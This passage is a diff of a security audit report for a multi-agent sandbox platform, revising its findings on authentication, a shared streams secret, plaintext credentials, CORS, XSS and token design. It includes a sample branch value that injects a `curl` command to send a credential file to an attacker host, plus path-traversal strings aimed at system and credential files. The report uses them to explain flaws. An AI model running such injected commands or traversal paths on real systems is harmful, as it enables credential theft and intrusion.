@@ -2,7 +2,7 @@
 
 **Date:** 2026-03-11
 **Scope:** `packages/studio`, `packages/protocol`, `packages/agent`
-**Auditor:** Automated security analysis (Claude)
+**Auditor:** Multi-pass automated security analysis (Claude)
 
 ---
 
@@ -10,83 +10,66 @@
 
 The Electric Agent Studio is a multi-agent orchestration platform where sandboxed AI agents (running in Fly.io Sprites or Docker) communicate via Durable Streams. The security model relies on:
 - **Session tokens** (HMAC-SHA256) for per-session API authentication
-- **Room membership** enforced at the application layer for agent-to-agent messaging
+- **Room tokens** (HMAC-SHA256) for room-scoped API authentication
 - **Sandbox isolation** via Sprites VMs or Docker containers
 - **Client-side credential storage** (keys passed per-request, not persisted server-side)
+- **DS_SECRET proxy pattern** — the master Durable Streams secret never leaves the server process
 
-This audit identified **5 critical**, **6 high**, and **9 medium** severity issues.
+### Fixes Applied Since Last Audit
+
+Several critical and high issues from the previous audit have been **resolved**:
+
+| Fix | Changeset | Status |
+|-----|-----------|--------|
+| Room auth middleware added | `room-auth-middleware.md` | **FIXED** — Room routes now validate `X-Room-Token` |
+| `/api/hook` authentication added | `security-fixes-cmdinjection-hookauth.md` | **FIXED** — Global hook secret required |
+| Command injection mitigated | `security-fixes-cmdinjection-hookauth.md` | **FIXED** — `validateName`, `validateBranchName`, `validateRepoUrl`, `shellQuote` |
+| OAuth token logging removed | `security-fixes-cmdinjection-hookauth.md` | **FIXED** — Now only logs token length |
+| DS_SECRET isolation | `ds-proxy-secret-isolation.md` | **FIXED** — `getStreamEnvVars` removed, proxy pattern added |
+| Shared sessions removed | Code removal | **FIXED** — No shared-sessions endpoints remain |
+
+This audit identifies **3 critical**, **4 high**, and **10 medium** severity issues that remain open or are newly discovered.
 
 ---
 
 ## Table of Contents
 
-1. [CRITICAL: Unauthenticated Endpoints](#1-critical-unauthenticated-endpoints)
-2. [CRITICAL: Single DS Secret = Cross-Room Stream Access](#2-critical-single-ds-secret--cross-room-stream-access)
-3. [CRITICAL: `/api/hook` Endpoint Has No Authentication](#3-critical-apihook-endpoint-has-no-authentication)
-4. [CRITICAL: Credentials Written to Sprite Filesystem in Plaintext](#4-critical-credentials-written-to-sprite-filesystem-in-plaintext)
-5. [CRITICAL: OAuth Token Logged to Console](#5-critical-oauth-token-logged-to-console)
-6. [HIGH: Room/Sandbox Routes Lack Auth Middleware](#6-high-roomsandbox-routes-lack-auth-middleware)
-7. [HIGH: Session Token Minting for Any Linked Session](#7-high-session-token-minting-for-any-linked-session)
-8. [HIGH: CORS `origin: "*"` on All Routes](#8-high-cors-origin--on-all-routes)
-9. [HIGH: Command Injection via Project Name / Repo URL](#9-high-command-injection-via-project-name--repo-url)
-10. [HIGH: XSS via `dangerouslySetInnerHTML`](#10-high-xss-via-dangerouslysetinnerhtml)
-11. [HIGH: Missing Input Validation on API Bodies](#11-high-missing-input-validation-on-api-bodies)
-12. [MEDIUM: `/api/provision-electric` Is Unauthenticated](#12-medium-apiprovision-electric-is-unauthenticated)
-13. [MEDIUM: Room Message Routing Has No Cryptographic Enforcement](#13-medium-room-message-routing-has-no-cryptographic-enforcement)
-14. [MEDIUM: DS Secret Passed to Every Sandbox](#14-medium-ds-secret-passed-to-every-sandbox)
-15. [MEDIUM: No Expiry on Session Tokens](#15-medium-no-expiry-on-session-tokens)
-16. [MEDIUM: Keychain Endpoint Leaks OAuth Tokens](#16-medium-keychain-endpoint-leaks-oauth-tokens)
-17. [MEDIUM: Error Messages May Leak Internal State](#17-medium-error-messages-may-leak-internal-state)
-18. [MEDIUM: File Path Traversal Check Is Bypassable](#18-medium-file-path-traversal-check-is-bypassable)
-19. [MEDIUM: Missing HTTP Security Headers](#19-medium-missing-http-security-headers)
-20. [MEDIUM: Credentials Stored in localStorage (XSS Amplifier)](#20-medium-credentials-stored-in-localstorage-xss-amplifier)
+### Critical
+1. [Single DS_SECRET = Cross-Room Stream Access at Durable Streams Layer](#1-critical-single-ds_secret--cross-room-stream-access-at-durable-streams-layer)
+2. [Credentials Written to Sprite Filesystem in Plaintext](#2-critical-credentials-written-to-sprite-filesystem-in-plaintext)
+3. [Unauthenticated Sandbox and Session-Creation Endpoints](#3-critical-unauthenticated-sandbox-and-session-creation-endpoints)
+
+### High
+4. [CORS `origin: "*"` on All Routes](#4-high-cors-origin--on-all-routes)
+5. [XSS via `dangerouslySetInnerHTML`](#5-high-xss-via-dangerouslysetinnerhtml)
+6. [Missing Input Validation on API Request Bodies](#6-high-missing-input-validation-on-api-request-bodies)
+7. [Keychain Endpoint Leaks OAuth Token Without Auth](#7-high-keychain-endpoint-leaks-oauth-token-without-auth)
+
+### Medium
+8. [Room Token / Session Token Confusion](#8-medium-room-token--session-token-confusion)
+9. [File Path Traversal Check Is Bypassable](#9-medium-file-path-traversal-check-is-bypassable)
+10. [No Expiry on Session/Room Tokens](#10-medium-no-expiry-on-sessionroom-tokens)
+11. [`/api/provision-electric` Is Unauthenticated](#11-medium-apiprovision-electric-is-unauthenticated)
+12. [Room Message `from` Field Is Not Cryptographically Verified](#12-medium-room-message-from-field-is-not-cryptographically-verified)
+13. [Missing HTTP Security Headers](#13-medium-missing-http-security-headers)
+14. [Credentials Stored in localStorage (XSS Amplifier)](#14-medium-credentials-stored-in-localstorage-xss-amplifier)
+15. [Sandbox Network Policy Allows All Outbound Traffic](#15-medium-sandbox-network-policy-allows-all-outbound-traffic)
+16. [Docker Sandbox Missing Input Validation on Repo URL](#16-medium-docker-sandbox-missing-input-validation-on-repo-url)
+17. [Session/Room Tokens Exposed in SSE Query Strings](#17-medium-sessionroom-tokens-exposed-in-sse-query-strings)
 
 ---
 
 ## Detailed Findings
 
-### 1. CRITICAL: Unauthenticated Endpoints
+### 1. CRITICAL: Single DS_SECRET = Cross-Room Stream Access at Durable Streams Layer
 
-**Files:** `packages/studio/src/server.ts:1718-1788`, `packages/studio/src/server.ts:2108-2155`
-
-**Description:**
-Several sensitive endpoints have **no authentication at all**:
-
-| Endpoint | Risk |
-|---|---|
-| `GET /api/sandboxes` | Lists all active sandboxes (session IDs, ports, project dirs) |
-| `GET /api/sandboxes/:sessionId` | Reads sandbox details for any session |
-| `POST /api/sandboxes` | Creates arbitrary sandboxes |
-| `DELETE /api/sandboxes/:sessionId` | Destroys any sandbox |
-| `POST /api/rooms` | Creates rooms without authentication |
-| `GET /api/rooms/:id` | Reads room state (participants, session IDs) |
-| `POST /api/rooms/:id/agents` | Adds agents to any room |
-| `POST /api/rooms/:id/messages` | Sends messages to any room |
-| `POST /api/rooms/:id/close` | Closes any room |
-| `GET /api/rooms/:id/events` | Subscribes to any room's event stream |
-| `POST /api/rooms/:id/sessions` | Adds existing sessions to rooms (has session token check, good) |
-| `POST /api/rooms/:id/sessions/:sessionId/iterate` | Sends commands to any agent in any room |
-| `POST /api/sessions` | Creates sessions (accepts API keys in body) |
-
-**Impact:** Any network-adjacent attacker can enumerate sessions, read room state, inject messages into rooms, create/destroy sandboxes, and add rogue agents to existing rooms. This directly violates the requirement that "sandboxes cannot interfere with each other unless in the same room" — an attacker can simply add their agent to any room.
-
-**Recommendation:**
-- Add authentication middleware to all `/api/rooms/*` and `/api/sandboxes/*` routes
-- Require a room token (derived from room ID) for all room-scoped operations
-- Require a server-level admin token for session/sandbox creation
-- At minimum, protect `POST /api/sessions` since it accepts API keys in the request body
-
----
-
-### 2. CRITICAL: Single DS Secret = Cross-Room Stream Access
-
-**File:** `packages/studio/src/streams.ts:43-95`
+**File:** `packages/studio/src/streams.ts:43-80`
 
 **Description:**
-All Durable Stream connections use the **same `DS_SECRET`** for authorization:
+All Durable Stream connections (sessions, rooms, registry) use the **same `DS_SECRET`** for authorization:
 
 ```typescript
-// Every stream (session, shared, room, registry) uses identical auth
+// Every stream uses identical auth header
 headers: {
     Authorization: `Bearer ${config.secret}`,
 }
@@ -97,56 +80,33 @@ The stream URL scheme is predictable:
 - Room: `${url}/v1/stream/${serviceId}/room/${roomId}`
 - Registry: `${url}/v1/stream/${serviceId}/registry`
 
-**Impact:** If any single agent or sandbox gains access to the DS_SECRET (which they do — see finding #12), they can:
-1. **Read any other session's stream** by constructing the URL with a known session ID
-2. **Read any room's stream** by constructing the URL with a known room ID
-3. **Write to any stream** (inject messages, fake events)
-4. **Read the registry stream** to enumerate all rooms and sessions
+**What changed:** The DS_SECRET is no longer passed to sandboxes as an env var (fix in `ds-proxy-secret-isolation.md`). Sandboxes use the `/api/sessions/:id/stream/append` proxy instead. This **significantly reduces** the attack surface.
 
-This completely breaks the room-based isolation model. An agent in Room A can read all messages from Room B.
+**What remains:** The DS_SECRET is still a single master key. If it leaks from the server process (e.g., via error logging, memory dump, or a vulnerability in the server), it grants read/write access to ALL streams. There is no per-room or per-session scoping at the Durable Streams layer.
+
+**Impact:** If the DS_SECRET is compromised, an attacker can:
+1. Read any session's event stream (full conversation history)
+2. Read any room's message stream
+3. Write to any stream (inject fake events, forge messages)
+4. Read the registry stream to enumerate all rooms
+
+**Mitigating factor:** Since sandboxes no longer have the DS_SECRET, the primary risk vector is a compromise of the studio server itself.
 
 **Recommendation:**
-- Use per-stream or per-room scoped tokens (JWT with claims scoping to specific stream paths)
-- Never pass the master DS_SECRET to sandboxes
-- Use a proxy pattern where the studio server mediates all stream access
+- Use Durable Streams' JWT support with scoped claims (limit each token to specific stream paths)
+- Generate per-room/per-session JWTs with short TTLs
+- Monitor for DS_SECRET rotation practices
+
+**Severity: CRITICAL** (if DS_SECRET leaks, all isolation is broken)
 
 ---
 
-### 3. CRITICAL: `/api/hook` Endpoint Has No Authentication
+### 2. CRITICAL: Credentials Written to Sprite Filesystem in Plaintext
 
-**File:** `packages/studio/src/server.ts:662-808`
-
-**Description:**
-The unified hook endpoint `POST /api/hook` accepts arbitrary JSON payloads **without any authentication**:
-
-```typescript
-app.post("/api/hook", async (c) => {
-    const body = (await c.req.json()) as Record<string, unknown>
-    // No auth check — anyone can post events
-    // Auto-creates sessions on first request
-})
-```
-
-Compare this to `POST /api/sessions/:id/hook-event` which properly validates a hook token.
-
-**Impact:**
-- An attacker can create unlimited sessions by posting `SessionStart` events
-- Injected events appear in the UI as real agent events
-- Could be used to phish users by injecting fake `ask_user_question` events
-- DoS vector: flood the server with session creations
-
-**Recommendation:**
-- Add authentication to `/api/hook` (e.g., a shared secret or signed payload)
-- Or require pre-registration: only accept events for existing sessions
-
----
-
-### 4. CRITICAL: Credentials Written to Sprite Filesystem in Plaintext
-
-**File:** `packages/studio/src/sandbox/sprites.ts:130-164`
+**File:** `packages/studio/src/sandbox/sprites.ts:160-194`
 
 **Description:**
-API keys, OAuth tokens, and GitHub tokens are written to the sprite filesystem as shell environment variables in plaintext:
+API keys, OAuth tokens, and GitHub tokens are written as plaintext shell exports to the sandbox filesystem:
 
 ```typescript
 if (opts?.oauthToken) {
@@ -158,7 +118,6 @@ if (opts?.ghToken) {
     envVars.GH_TOKEN = opts.ghToken
 }
 
-// Written to a file readable by all processes in the sprite
 const envLines = Object.entries(envVars)
     .map(([k, v]) => `export ${k}=${JSON.stringify(v)}`)
     .join("\n")
@@ -170,150 +129,86 @@ await sprite.execFile("bash", [
 ```
 
 **Impact:**
-- The AI agent running inside the sandbox has full access to these credentials
-- If the agent is compromised (prompt injection), it can exfiltrate the API key and GitHub token
-- The file `/etc/profile.d/electric-agent.sh` is world-readable
-- The credentials persist on disk for the lifetime of the sprite
+- The AI agent inside the sandbox has **full access** to these credentials
+- If the agent is compromised via prompt injection, it can exfiltrate the API key and GitHub token
+- The file `/etc/profile.d/electric-agent.sh` is world-readable by default
+- Credentials persist for the lifetime of the Sprite VM
 
-**User's requirement: "the server never stores user credentials"** — While the studio server process doesn't persist them to a database, they ARE persisted to the sandbox filesystem. This is a nuanced violation: the server-side Node.js process holds them in memory during sandbox creation and writes them to the sandbox.
+**User requirement: "the server never stores user credentials":**
+- **Server process:** PASS — no persistent storage (DB or filesystem)
+- **Server memory:** PARTIAL — credentials exist transiently during request handling
+- **Sandbox filesystem:** FAIL — written as plaintext to `/etc/profile.d/electric-agent.sh`
+- **Durable Streams:** PASS — credentials not written to event streams
+- **Server logs:** PASS — only token length logged (previously fixed)
 
 **Recommendation:**
-- Consider a credential proxy: sandbox requests go through the studio server which injects the auth header, so the sandbox never holds raw keys
-- If direct credential access is unavoidable, use ephemeral environment variables (not files) and clear them after the process starts
-- Set restrictive file permissions (0600) on credential files
-- Document this as a known trade-off in the security model
+1. **Credential proxy pattern** (best): Sandbox requests to Claude API / GitHub go through the studio server, which injects auth headers. Sandbox never holds raw keys.
+2. **If direct credential access is unavoidable:**
+   - Set file permissions to `0600` immediately after creation
+   - Delete the file after the process reads it
+   - Use environment-only injection (not files) if the sandbox runtime supports it
 
 ---
 
-### 5. CRITICAL: OAuth Token Logged to Console
+### 3. CRITICAL: Unauthenticated Sandbox and Session-Creation Endpoints
 
-**File:** `packages/studio/src/server.ts:2799-2801`
+**File:** `packages/studio/src/server.ts:1725-1797, 905-960`
 
 **Description:**
-```typescript
-console.log(
-    `[dev] Loaded OAuth token from keychain: ${token.slice(0, 20)}...${token.slice(-10)}`,
-)
-```
+Several sensitive endpoints remain **unauthenticated**:
 
-**Impact:** The OAuth token's first 20 and last 10 characters are logged. Depending on token format and entropy distribution, this may be sufficient to reconstruct or brute-force the full token. Server logs are often stored in log aggregation systems with broader access.
+| Endpoint | Risk |
+|---|---|
+| `GET /api/sandboxes` | Lists all active sandboxes (session IDs, ports, project dirs) |
+| `GET /api/sandboxes/:sessionId` | Reads sandbox details for any session |
+| `POST /api/sandboxes` | Creates arbitrary sandboxes (resource consumption) |
+| `DELETE /api/sandboxes/:sessionId` | Destroys any sandbox |
+| `POST /api/sessions` | Creates sessions — accepts API keys in request body |
+| `POST /api/sessions/resume` | Creates sessions from GitHub repos — accepts credentials |
+| `POST /api/sessions/local` | Creates local sessions |
+| `POST /api/sessions/auto` | Auto-creates sessions |
+| `GET /api/sessions` | Lists all sessions (if endpoint exists) |
+
+**Impact:**
+- Any network-adjacent attacker can enumerate all sessions and sandboxes
+- An attacker can create unlimited sandboxes (cost/resource abuse on Fly.io)
+- An attacker can destroy other users' sandboxes
+- Session creation endpoints accept API keys in the body with no auth — a confused deputy could be tricked into sending credentials
 
 **Recommendation:**
-- Never log credentials, even partially
-- Log only a confirmation like `[dev] Loaded OAuth token from keychain (length: ${token.length})`
+- Add admin-level authentication to all `/api/sandboxes/*` routes
+- Protect session creation with at minimum a server-level API key or OAuth
+- Consider separate admin vs user authentication tiers
 
 ---
 
-### 6. HIGH: Room/Sandbox Routes Lack Auth Middleware
+### 4. HIGH: CORS `origin: "*"` on All Routes
 
-**Files:** `packages/studio/src/server.ts:2108-2601`
+**File:** `packages/studio/src/server.ts:369`
 
-**Description:**
-The auth middleware pattern at lines 439-465 only protects `/api/sessions/:id/*`. There is **no equivalent middleware** for:
-- `/api/rooms/*` — All room operations are unprotected
-- `/api/sandboxes/*` — All sandbox CRUD operations are unprotected
-- `/api/shared-sessions/:id/*` — Protected, but only sub-routes, not all operations
-
-The room token (`roomToken`) is returned from `POST /api/rooms` and `GET /api/rooms/join/:id/:code`, but is **never validated** on subsequent room API calls.
-
-**Impact:** The room token is generated but never enforced. Any client that knows a room ID can perform all room operations without proving they're a member.
-
-**Recommendation:**
-- Add auth middleware for `/api/rooms/:id/*` that validates the room token
-- Add auth middleware for `/api/sandboxes/*` (admin-level auth)
-- Validate room membership before allowing `POST /api/rooms/:id/agents` and `POST /api/rooms/:id/messages`
-
----
-
-### 7. HIGH: Session Token Minting for Any Linked Session
-
-**File:** `packages/studio/src/server.ts:2009-2013`
-
-**Description:**
-```typescript
-app.get("/api/shared-sessions/:id/sessions/:sessionId/token", (c) => {
-    const sessionId = c.req.param("sessionId")
-    const sessionToken = deriveSessionToken(config.streamConfig.secret, sessionId)
-    return c.json({ sessionToken })
-})
-```
-
-This endpoint mints a session token for **any arbitrary session ID** as long as the caller has a valid shared-session token. There is no check that the requested `sessionId` is actually linked to the shared session.
-
-**Impact:** A user with access to any shared session can generate valid session tokens for **any session on the server**, not just those linked to their room. This is a privilege escalation path.
-
-**Recommendation:**
-- Verify that `sessionId` is actually linked to the shared session before minting a token
-- Replay the shared session stream to check for a `session_linked` event for the requested session ID
-
----
-
-### 8. HIGH: CORS `origin: "*"` on All Routes
-
-**File:** `packages/studio/src/server.ts:376`
-
-**Description:**
 ```typescript
 app.use("*", cors({ origin: "*" }))
 ```
 
-All API routes accept requests from any origin.
-
 **Impact:**
-- Any website visited by a user can make authenticated API calls to the studio server
-- Combined with the credential endpoints (e.g., `/api/credentials/keychain`), a malicious website could steal OAuth tokens
-- Enables cross-site request forgery for all mutation endpoints
+- Any website visited by a user can make API calls to the studio server
+- Combined with `/api/credentials/keychain` (finding #7), a malicious site can steal OAuth tokens
+- Combined with unauthenticated endpoints (finding #3), any site can create sessions or destroy sandboxes
+- Enables cross-origin attacks on all mutation endpoints
 
 **Recommendation:**
-- Restrict CORS to known origins (the studio frontend URL)
-- For development, use a configurable allowlist
-- At minimum, don't allow `*` on credential-returning endpoints
+- Restrict CORS to the studio frontend's actual origin
+- For development, use a configurable allowlist (e.g., `CORS_ORIGINS` env var)
+- At minimum, restrict CORS on credential-returning endpoints
 
 ---
 
-### 9. HIGH: Command Injection via Project Name / Repo URL
-
-**Files:** `packages/studio/src/sandbox/sprites.ts:107,380-381`, `packages/studio/src/server.ts:1102-1113`
-
-**Description:**
-User-controlled strings are interpolated into shell commands:
-
-```typescript
-// sprites.ts:107
-const projectDir = `/home/agent/workspace/${projectName}`
-await sprite.exec(`mkdir -p ${projectDir}`)
-
-// sprites.ts:380-381
-await this.exec(handle,
-    `gh repo clone "${repoUrl}" "${targetDir}" 2>/dev/null || git clone "${repoUrl}" "${targetDir}"`)
-
-// server.ts:1106 - sed with projectName
-await config.sandbox.exec(handle,
-    `cd '${handle.projectDir}' && sed -i 's/"name": "scaffold-base"/"name": "${projectName}"/' package.json`)
-```
-
-While `projectName` is sanitized (slug-like), `repoUrl` and `body.branch` in `createFromRepo` are not sanitized:
-
-```typescript
-// sprites.ts:384
-await this.exec(handle, `cd ${targetDir} && git checkout ${opts.branch}`)
-```
-
-**Impact:** A malicious `branch` value like `main; curl attacker.com/exfil?key=$(cat /etc/profile.d/electric-agent.sh)` could execute arbitrary commands in the sandbox, exfiltrating credentials.
-
-**Recommendation:**
-- Use `execFile` with explicit argument arrays instead of string interpolation for all shell commands
-- Validate and sanitize all user inputs (repo URLs, branch names, project names) against strict allowlists
-- Use `--` to separate git options from arguments: `git checkout -- ${branch}`
-
----
-
-### 10. HIGH: XSS via `dangerouslySetInnerHTML`
+### 5. HIGH: XSS via `dangerouslySetInnerHTML`
 
 **Files:** `packages/studio/client/src/components/Markdown.tsx:15`, `packages/studio/client/src/components/ToolExecution.tsx:62`
 
 **Description:**
-Both components use `dangerouslySetInnerHTML` with output from the `sugar-high` syntax highlighting library:
+Both components render unsanitized HTML via `dangerouslySetInnerHTML`:
 
 ```typescript
 // Markdown.tsx
@@ -325,32 +220,27 @@ const html = highlight(content) + (truncated ? "\n... (truncated)" : "")
 return <pre dangerouslySetInnerHTML={{ __html: html }} />
 ```
 
-The `content` flowing into these components comes from agent output (tool responses, assistant messages), which could contain crafted payloads if an agent is compromised via prompt injection.
+The `content` comes from agent output (tool responses, assistant messages). A compromised agent (via prompt injection) could emit code blocks containing crafted HTML/JS payloads.
 
-**Impact:** If `sugar-high` has a parsing vulnerability or doesn't fully escape special characters, an attacker could inject arbitrary HTML/JavaScript. The `ToolExecution.tsx` case also concatenates a string directly to the highlighted HTML output.
+**Impact:**
+- If `sugar-high` has a parsing vulnerability or doesn't fully escape HTML entities, arbitrary JS execution is possible
+- `ToolExecution.tsx` concatenates a raw string to the highlighted HTML
+- Combined with finding #13 (localStorage credentials), XSS can steal API keys and OAuth tokens
 
 **Recommendation:**
-- Sanitize the output of `sugar-high` with a library like DOMPurify before setting innerHTML
-- Or use a safer rendering approach that doesn't require `dangerouslySetInnerHTML`
-- At minimum, audit `sugar-high`'s escaping guarantees
+- Sanitize output with DOMPurify before setting innerHTML
+- Or use a rendering approach that doesn't require `dangerouslySetInnerHTML`
 
 ---
 
-### 11. HIGH: Missing Input Validation on API Bodies
+### 6. HIGH: Missing Input Validation on API Request Bodies
 
-**Files:** Throughout `packages/studio/src/server.ts`
+**File:** `packages/studio/src/server.ts` (throughout)
 
 **Description:**
-Request bodies are cast to TypeScript types but never validated at runtime:
+Request bodies are cast to TypeScript interfaces but never validated at runtime:
 
 ```typescript
-// Line 480 — no validation
-const body = (await c.req.json().catch(() => ({}))) as { description?: string }
-
-// Line 521 — cast without validation
-const body = (await c.req.json()) as Record<string, unknown>
-
-// Line 898 — accepts apiKey, oauthToken, ghToken with no format validation
 const body = (await c.req.json()) as {
     description: string
     apiKey?: string
@@ -359,147 +249,83 @@ const body = (await c.req.json()) as {
 }
 ```
 
-TypeScript type assertions provide zero runtime protection. Malformed payloads (wrong types, missing fields, oversized strings, unexpected nested objects) are passed directly to business logic.
+TypeScript type assertions provide **zero runtime protection**.
 
 **Impact:**
-- Unexpected data types could cause runtime crashes or unexpected behavior
-- Oversized payloads could cause memory issues
-- Malformed fields could trigger edge cases in downstream code
+- Wrong types, missing fields, oversized strings, or unexpected nested objects pass directly to business logic
+- Could cause crashes, unexpected behavior, or edge case exploitation
 
 **Recommendation:**
 - Use Zod schemas (already a project dependency) to validate all API request bodies
-- Reject requests that don't match expected shape with 400 errors
+- Return 400 errors for malformed payloads
+- Set maximum string lengths for credential fields
 
 ---
 
-### 12. MEDIUM: `/api/provision-electric` Is Unauthenticated
+### 7. HIGH: Keychain Endpoint Leaks OAuth Token Without Auth
 
-**File:** `packages/studio/src/server.ts:400-416`
+**File:** `packages/studio/src/server.ts:2558-2579`
 
-**Description:**
-The endpoint provisions real Electric Cloud resources (database + sync service) with no authentication. Each call creates actual cloud infrastructure.
-
-**Impact:** Resource exhaustion / cost abuse. An attacker can repeatedly call this endpoint to provision unlimited databases.
-
-**Recommendation:**
-- Add authentication or at minimum implement request throttling
-- Consider requiring a valid session token
-
----
-
-### 13. MEDIUM: Room Message Routing Has No Cryptographic Enforcement
-
-**File:** `packages/studio/src/room-router.ts`
-
-**Description:**
-Room isolation is enforced purely at the application layer via in-memory `Map<string, InternalParticipant>`. The `RoomRouter`:
-1. Only delivers messages to participants in its `_participants` map
-2. Only routes `assistant_message` events through `handleAgentOutput`
-
-However:
-- There is no cryptographic verification that a message originated from a legitimate participant
-- The room stream itself is a plain Durable Stream — anyone with the DS_SECRET can append to it
-- Message `from` fields are display names, not cryptographically signed identities
-
-**Impact:** Combined with finding #2 (shared DS_SECRET), any entity with the DS secret can inject messages into a room stream that appear to come from any participant.
-
-**Recommendation:**
-- Sign messages before appending to the room stream
-- Verify signatures on message delivery
-- Or better: ensure only the studio server can write to room streams (proxy pattern)
-
----
-
-### 14. MEDIUM: DS Secret Passed to Every Sandbox
-
-**File:** `packages/studio/src/streams.ts:100-107`
-
-**Description:**
 ```typescript
-export function getStreamEnvVars(sessionId: string, config: StreamConfig): Record<string, string> {
-    return {
-        DS_URL: config.url,
-        DS_SERVICE_ID: config.serviceId,
-        DS_SECRET: config.secret,  // Master secret!
-        SESSION_ID: sessionId,
-    }
-}
+app.get("/api/credentials/keychain", (c) => {
+    if (process.platform !== "darwin") return c.json({ apiKey: null })
+    // ... reads OAuth token from macOS Keychain and returns it in JSON
+    return c.json({ oauthToken: token })
+})
 ```
-
-Although this function exists, it appears to not currently be called in the sprites flow (credentials are passed differently). However, its existence suggests it was designed to share the DS secret with sandboxes. The Sprites bridge connects to streams using the master secret, and agents inside sprites can potentially discover stream URLs from process environment or network traffic.
-
-**Impact:** If agents access the DS secret (via env vars, network sniffing, or process inspection), they gain full access to all streams (see finding #2).
-
-**Recommendation:**
-- Generate per-session scoped tokens that only grant access to that session's stream
-- Remove `getStreamEnvVars` or replace with scoped credentials
-
----
-
-### 15. MEDIUM: No Expiry on Session Tokens
-
-**File:** `packages/studio/src/session-auth.ts`
-
-**Description:**
-Session tokens are simple HMAC-SHA256 signatures with no expiry:
-```typescript
-export function deriveSessionToken(secret: string, sessionId: string): string {
-    return crypto.createHmac("sha256", secret).update(sessionId).digest("hex")
-}
-```
-
-**Impact:** Once a session token is obtained, it remains valid forever (or until the DS_SECRET is rotated). There is no revocation mechanism.
-
-**Recommendation:**
-- Include a timestamp in the HMAC input and validate freshness
-- Or use JWTs with an `exp` claim
-- Implement a token revocation mechanism
-
----
-
-### 16. MEDIUM: Keychain Endpoint Leaks OAuth Tokens
-
-**File:** `packages/studio/src/server.ts:2786-2809`
-
-**Description:**
-`GET /api/credentials/keychain` reads the Claude Code OAuth token from the macOS Keychain and returns it in a JSON response. This endpoint has no authentication.
 
 **Impact:**
-- Combined with CORS `origin: "*"`, any website can steal the user's Claude Code OAuth token
-- The endpoint is meant for development convenience but is a significant security risk if the server is accessible on a network
+- No authentication required
+- Combined with CORS `origin: "*"`, **any website can steal the user's Claude Code OAuth token** by making a fetch request to `http://localhost:<port>/api/credentials/keychain`
+- This is the single most exploitable vulnerability for credential theft on developer machines
 
 **Recommendation:**
 - Remove this endpoint in production builds
-- Add authentication
-- At minimum, restrict to localhost-only (check `c.req.header("Host")`)
+- For development, restrict to localhost-only requests (validate `Host` header)
+- Add authentication even for development use
 
 ---
 
-### 17. MEDIUM: Error Messages May Leak Internal State
+### 8. MEDIUM: Room Token / Session Token Confusion
 
-**Files:** Various locations in `server.ts`
+**Files:** `packages/studio/src/server.ts:1817,1875`, `packages/studio/src/session-auth.ts:3-4`
 
 **Description:**
-Error responses sometimes include raw error messages:
+Room tokens are derived using the **same function** as session tokens:
+
 ```typescript
-const message = err instanceof Error ? err.message : "Provisioning failed"
-return c.json({ error: message }, 500)
+// Room creation (server.ts:1875)
+const roomToken = deriveSessionToken(config.streamConfig.secret, roomId)
+
+// Room validation (server.ts:1817)
+if (!token || !validateSessionToken(config.streamConfig.secret, id, token)) {
 ```
 
-**Impact:** Internal error messages may contain file paths, database connection strings, or stack traces that help attackers understand the system.
+Both compute `HMAC-SHA256(DS_SECRET, id)` with no type prefix. This means:
+- A session token for UUID `X` is **cryptographically identical** to a room token for UUID `X`
+- If a room ID happens to collide with a session ID (both are UUIDs, so unlikely but not impossible), tokens are interchangeable
+
+Compare with how hook tokens correctly use a prefix:
+```typescript
+// hook tokens — correctly scoped
+return crypto.createHmac("sha256", secret).update(`hook:${sessionId}`).digest("hex")
+```
+
+**Impact:** Token confusion attack — a session token could potentially be used as a room token and vice versa. While UUID collision is unlikely, the lack of type differentiation is a design flaw that violates the principle of least privilege.
 
 **Recommendation:**
-- Return generic error messages to clients
-- Log detailed errors server-side only
+Add a `room:` prefix to room token derivation:
+```typescript
+export function deriveRoomToken(secret: string, roomId: string): string {
+    return crypto.createHmac("sha256", secret).update(`room:${roomId}`).digest("hex")
+}
+```
 
 ---
 
-### 18. MEDIUM: File Path Traversal Check Is Bypassable
+### 9. MEDIUM: File Path Traversal Check Is Bypassable
 
-**File:** `packages/studio/src/server.ts:2738`
-
-**Description:**
-The file-content endpoint uses a `startsWith` check for path validation:
+**File:** `packages/studio/src/server.ts:2510`
 
 ```typescript
 if (!filePath.startsWith(sandboxDir)) {
@@ -507,57 +333,191 @@ if (!filePath.startsWith(sandboxDir)) {
 }
 ```
 
-If `sandboxDir = "/home/agent/workspace/myapp"`, then `"/home/agent/workspace/myapp-evil/../../../etc/passwd"` passes the `startsWith` check but resolves to a path outside the project directory.
-
-**Impact:** An attacker with a valid session token could read files outside the project directory within the sandbox (e.g., `/etc/profile.d/electric-agent.sh` which contains API keys).
-
-**Recommendation:**
-- Use `path.resolve()` to normalize the path before comparison
-- Use `path.relative()` and verify the result doesn't start with `..`
-
----
-
-### 19. MEDIUM: Missing HTTP Security Headers
-
-**File:** `packages/studio/src/server.ts`
-
-**Description:**
-The server does not set standard security headers:
-- No `Content-Security-Policy`
-- No `X-Content-Type-Options: nosniff`
-- No `X-Frame-Options`
-- No `Strict-Transport-Security` (HSTS)
-
-**Impact:** Increases attack surface for XSS, clickjacking, and MIME type sniffing attacks.
+**Impact:** If `sandboxDir = "/home/agent/workspace/myapp"`, then:
+- `"/home/agent/workspace/myapp-evil/../../../etc/profile.d/electric-agent.sh"` passes the `startsWith` check
+- This could expose credentials from the env file (finding #2)
 
 **Recommendation:**
-- Add Hono middleware to set security headers on all responses
-- At minimum add `X-Content-Type-Options: nosniff` and `X-Frame-Options: DENY`
-
----
-
-### 20. MEDIUM: Credentials Stored in localStorage (XSS Amplifier)
-
-**File:** `packages/studio/client/src/lib/credentials.ts:8-27`
-
-**Description:**
-API keys and OAuth tokens are stored in browser `localStorage`:
-
 ```typescript
-const ANTHROPIC_KEY = "electric-agent:anthropic-api-key"
-export function getApiKey(): string | null {
-    return localStorage.getItem(ANTHROPIC_KEY)
+const resolved = path.resolve(filePath)
+if (!resolved.startsWith(path.resolve(sandboxDir) + path.sep)) {
+    return c.json({ error: "Path outside project directory" }, 403)
 }
 ```
 
-While this is a common pattern and the keys never leave the browser except during session creation, `localStorage` is accessible to any JavaScript running on the page.
+---
 
-**Impact:** If any XSS vulnerability exists (see finding #10), an attacker's script can read all stored API keys and OAuth tokens. This makes XSS vulnerabilities significantly more damaging.
+### 10. MEDIUM: No Expiry on Session/Room Tokens
+
+**File:** `packages/studio/src/session-auth.ts`
+
+```typescript
+export function deriveSessionToken(secret: string, sessionId: string): string {
+    return crypto.createHmac("sha256", secret).update(sessionId).digest("hex")
+}
+```
+
+**Impact:** Tokens are valid forever (or until DS_SECRET rotates). There is no revocation mechanism. A leaked session token provides permanent access to that session's data.
 
 **Recommendation:**
